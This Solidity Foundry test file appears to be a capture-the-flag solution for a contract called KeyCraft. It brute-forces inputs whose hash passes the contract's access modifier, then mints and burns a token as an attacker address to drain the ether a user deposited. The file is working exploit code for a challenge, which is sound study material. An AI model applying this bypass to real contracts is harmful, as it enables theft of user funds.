// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";
import "openzeppelin-contracts/contracts/token/ERC721/ERC721.sol";
import "../src/KeyCraft.sol";

contract KC is Test {
    KeyCraft k;
    address owner;
    address user;
    address attacker;

    function toHexDigit(uint8 d) internal pure returns (bytes1) {
        if (0 <= d && d <= 9) {
            return bytes1(uint8(bytes1("0")) + d);
        } else if (10 <= uint8(d) && uint8(d) <= 15) {
            return bytes1(uint8(bytes1("a")) + d - 10);
        }
        revert();
    }

    function toHexString(uint a) public pure returns (string memory) {
        uint count = 0;
        uint b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint i = 0; i < count; ++i) {
            b = a % 16;
            res[count - i - 1] = toHexDigit(uint8(b));
            a /= 16;
        }
        return string(res);
    }

    function canPassModifier(bytes memory b) public pure returns (bool) {
        bool w;
        uint a = uint160(uint256(keccak256(b)));

        a = a >> 108;
        a = a << 240;
        a = a >> 240;

        w = (a == 13057);
        return w;
    }

    function getAttackerAddress(bytes memory b) public pure returns (address) {
        uint a = uint160(uint256(keccak256(b)));
        return address(uint160(a));
    }

    function setUp() public {
        owner = makeAddr("owner");
        user = makeAddr("user");
        attacker = 0x2B82c473333012BC1a239bF59F93b9916cDf7486;

        vm.deal(user, 1 ether);

        vm.startPrank(owner);
        k = new KeyCraft("KeyCraft", "KC");
        vm.stopPrank();

        vm.startPrank(user);
        k.mint{value: 1 ether}(hex"dead");
        vm.stopPrank();
    }

    function testKeyCraft() public {
        vm.startPrank(attacker);

        //Solution
        for (uint i = 0; i < 300000; i++) {
            bytes memory randomValue = bytes(toHexString(i));
            if (canPassModifier(randomValue)) {

                console.log("AttackerAddress:");
                console.log(getAttackerAddress(randomValue));

                k.mint(randomValue);
                k.burn(2);
                break;
            }
        }

        vm.stopPrank();
        assertEq(attacker.balance, 1 ether);
    }
}
